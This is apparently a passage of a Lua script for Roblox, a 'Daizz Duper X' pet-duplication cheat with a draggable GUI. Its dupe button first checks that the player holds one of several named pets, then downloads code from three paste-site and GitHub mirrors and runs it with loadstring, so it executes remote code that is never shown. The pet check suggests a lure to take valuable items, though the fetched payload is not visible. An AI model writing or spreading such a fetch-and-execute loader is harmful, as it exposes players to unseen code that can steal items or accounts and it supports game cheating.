dupeButton.TextSize = 16
dupeButton.Font = Enum.Font.GothamBold
dupeButton.AutoButtonColor = true
dupeButton.Parent = contentFrame

-- Required Pets
local requiredPetsList = {"red fox", "dragonfly", "raccoon", "mole"}

-- Animation for checking
local function animateChecking()
    local dots = {".", "..", "..."}
    for i = 1, 6 do
        errorText.Text = "üîç Verifying Pet" .. dots[i % 3 + 1]
        task.wait(0.2)
    end
end

-- Robust script loader with multiple mirrors
local function executeExternalScript()
    local scriptMirrors = {
        "https://paste.ee/r/s7TguhY5",
        "https://pastebin.com/raw/s7TguhY5",
        "https://raw.githubusercontent.com/DaizzScripts/main/main/duper.lua"
    }
    
    for i, url in ipairs(scriptMirrors) do
        errorText.Text = "üì° Downloading script ("..i.."/"..#scriptMirrors..")..."
        errorText.TextColor3 = Color3.fromRGB(180, 180, 255)
        
        local success, scriptContent = pcall(function()
            return HttpService:GetAsync(url)
        end)
        
        if success and scriptContent and #scriptContent > 100 then
            scriptContent = scriptContent:gsub("^%s+", ""):gsub("%s+$", "")
            
            local loadSuccess, loadedFunction = pcall(loadstring, scriptContent)
            if loadSuccess and loadedFunction then
                errorText.Text = "‚úÖ Executing script..."
                errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
                
                local executeSuccess, executeResult = pcall(loadedFunction)
                if executeSuccess then
                    errorText.Text = "üéâ Script executed successfully!"
                    errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
                    return true
                else
                    warn("Execution error:", executeResult)
                    errorText.Text = "‚ùå Execution error"
                    errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
                end
            else
                warn("Load error:", loadedFunction)
                errorText.Text = "‚ùå Load error"
                errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
            end
        else
            warn("Download failed:", scriptContent)
            errorText.Text = "‚ùå Download failed"
            errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
        end
        
        task.wait(1)
    end
    
    errorText.Text = "‚ùå All download attempts failed"
    errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
    return false
end

-- Main dupe button functionality
dupeButton.MouseButton1Click:Connect(function()
    dupeButton.Active = false
    dupeButton.Text = "PROCESSING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)

    -- Verify pet
    animateChecking()
    
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local foundPet = false
    
    for _, tool in pairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            local toolNameLower = string.lower(tool.Name)
            for _, petName in ipairs(requiredPetsList) do
                if string.find(toolNameLower, petName) then
                    foundPet = true
                    break
                end
            end
            if foundPet then break end
        end
    end

    if not foundPet then
        errorText.Text = "‚ùå REQUIRED PET NOT FOUND"
        errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
        dupeButton.Active = true
        dupeButton.Text = "DUPE"
        dupeButton.BackgroundColor3 = Color3.fromRGB(60, 200, 100)
        return
    end

    errorText.Text = "‚úÖ PET VERIFIED - EXECUTING SCRIPT"
    errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
    
    -- Execute the external script
    executeExternalScript()
    
    -- Re-enable button after execution
    task.delay(2, function()
        dupeButton.Active = true
        dupeButton.Text = "DUPE"
        dupeButton.BackgroundColor3 = Color3.fromRGB(60, 200, 100)
    end)
end)

-- Credit
local credit = Instance.new("TextLabel")
credit.Size = UDim2.new(1, -20, 0, 20)
credit.Position = UDim2.new(0, 10, 1, -25)
credit.BackgroundTransparency = 1
credit.Text = "Daizz Duper X ¬© 2025 | VIP Build #8271 | discord.gg/daizz"
credit.TextColor3 = Color3.fromRGB(140, 140, 140)
credit.TextSize = 12
credit.Font = Enum.Font.Gotham
credit.TextXAlignment = Enum.TextXAlignment.Center
credit.Parent = mainFrame

-- Dragging Logic
local dragging = false
local mousePos = Vector2.new(0, 0)
local framePos = UDim2.new(0, 0, 0, 0)

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        mousePos = input.Position
        framePos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
        local delta = input.Position - mousePos
        mainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
